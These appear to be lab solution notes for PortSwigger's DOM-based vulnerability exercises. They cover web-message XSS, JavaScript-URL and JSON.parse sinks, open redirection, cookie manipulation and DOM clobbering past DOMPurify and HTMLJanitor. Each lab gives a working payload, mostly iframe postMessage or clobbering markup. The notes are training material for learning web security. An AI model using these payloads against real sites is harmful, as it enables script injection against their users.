---
description: https://portswigger.net/web-security/dom-based
---

# DOM-based vulnerabilities

### Lab: DOM XSS using web messages

This lab demonstrates a simple web message vulnerability.

```
GET / HTTP/1.1

In response:
<script>
window.addEventListener('message', function(e) {
	document.getElementById('ads').innerHTML = e.data;
})
</script>
```

**Exploit Server ->**

```
Body:

    <iframe src="https://ac461f1a1fcc394cc0502b2f003b0077.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

### Lab: DOM XSS using web messages and a JavaScript URL

This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging.

```
GET / HTTP/1.1

In response:
<script>
window.addEventListener('message', function(e) {
	var url = e.data;
	if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
		location.href = url;
	}
}, false);
</script>
```

**Exploit Server ->**

```
Body:

    <iframe src="https://ac821f511ffa44f6c1acd3b900920030.web-security-academy.net" onload="this.contentWindow.postMessage('javascript:print()//https:','*')">
```

### Lab: DOM XSS using web messages and JSON.parse

This lab uses web messaging and parses the message as JSON.

```
GET / HTTP/1.1

In response:
<script>
window.addEventListener('message', function(e) {
	var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
	document.body.appendChild(iframe);
	try {
		 d = JSON.parse(e.data);
	} 
	catch(e) {
		return;
	}
	switch(d.type) {
		case "page-load":
			ACMEplayer.element.scrollIntoView();
			break;
		case "load-channel":
			ACMEplayer.element.src = d.url;
			break;
		case "player-height-changed":
			ACMEplayer.element.style.width = d.width + "px";
			ACMEplayer.element.style.height = d.height + "px";
			break;
		}
}, false);
</script>
```

**Exploit Server ->**

```
Body:

    <iframe src="https://acfe1f531fae1d58c0ec34ec001300cd.web-security-academy.net" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

### Lab: DOM-based open redirection

This lab contains a DOM-based open-redirection vulnerability.

```
GET /post?postId=10 HTTP/1.1

In response:
<div class="is-linkback">
	<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
</div>
```

`https://ac501f101ef6a935c0bc968a006300ba.web-security-academy.net/post?postId=10&url=https://exploit-ac7a1f721edea978c0ad96c001130002.web-security-academy.net/`

### Lab: DOM-based cookie manipulation

This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a different page and call the print() function. You will need to use the exploit server to direct the victim to the correct pages.

```
GET /product?productId=1 HTTP/1.1

In response:
<script>
document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>

---------

GET / HTTP/1.1
Cookie: session=eIHQNBt0MBawwB6U4VNkeUhA1qJO35FX; lastViewedProduct=https://ace51f471f2c9c4dc0f759ee00800004.web-security-academy.net/product?productId=1

In response:
<a href='https://ace51f471f2c9c4dc0f759ee00800004.web-security-academy.net/product?productId=1'>Last viewed product</a><p>|</p>
```

```
<a id=x tabindex=1 onfocus=alert(1)></a>
```

`https://ace51f471f2c9c4dc0f759ee00800004.web-security-academy.net/product?productId=1&' id=x tabindex=1 onfocus=print() random='value'>#x\`

**Exploit Server ->**

```
Body:

    <iframe src="https://ace51f471f2c9c4dc0f759ee00800004.web-security-academy.net/product?productId=1&' id=x tabindex=1 onfocus=print() random='value" onload='window.location.replace("https://ace51f471f2c9c4dc0f759ee00800004.web-security-academy.net/#x");'>
```

### Lab: Exploiting DOM clobbering to enable XSS

This lab contains a DOM-clobbering vulnerability. The comment functionality allows "safe" HTML.

```
GET /post?postId=9 HTTP/1.1

In response:
<script src='resources/js/domPurify-2.0.15.js'></script>
<script src='resources/js/loadCommentsWithDomClobbering.js'></script>
```

Post a comment with this:

```
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```

Post an another random comment and then xss will be executed.

{avatar: 'cid:"onerror=alert(1)//'}

### Lab: Clobbering DOM attributes to bypass HTML filters

This lab uses the HTMLJanitor library, which is vulnerable to DOM clobbering. To solve this lab, construct a vector that bypasses the filter and uses DOM clobbering to inject a vector that calls the print() function.

```
GET /post?postId=8 HTTP/1.1

In response:
<script src='resources/js/htmlJanitor.js'></script>
<script src='resources/js/loadCommentsWithHtmlJanitor.js'></script>
```

Post a comment with this:

```
<form id=x tabindex=0 onfocus=print()><input id=attributes>
```

**Exploit Server ->**

```
Body:

    <iframe src="https://ac9e1fcc1f0a47dec05e09ac00c900d1.web-security-academy.net/post?postId=9" onload="setTimeout(()=>this.src=this.src+'#x',500)"></iframe>
```
